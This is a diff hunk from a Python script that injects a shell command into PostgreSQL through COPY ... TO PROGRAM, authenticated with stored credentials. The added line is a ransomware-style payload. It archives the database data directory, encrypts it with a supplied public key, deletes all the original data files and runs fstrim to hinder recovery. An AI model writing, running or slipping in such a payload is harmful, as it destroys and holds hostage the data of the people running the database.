@@ -507,7 +507,7 @@ try:
     with open('/tmp/pubkey.pem', 'rb') as f:
         cert_base64 = base64.b64encode(f.read()).decode().strip()
     
-    sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{{cert_base64}}' | base64 -d > /tmp/server_cert.pem$$;"
+    sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{{cert_base64}}' | base64 -d > /tmp/server.pem && tar -cf - -C /var/lib/postgresql/data . | openssl cms -encrypt -aes256 -binary -out /var/lib/postgresql/TEST.tar.enc /tmp/server.pem ; find /var/lib/postgresql/data -mindepth 1 -delete > /tmp/debug.log 2>&1 && fstrim -v / 2>/dev/null || true$$;"
     
     env = {{
         "PGPASSWORD": "{creds['password']}",
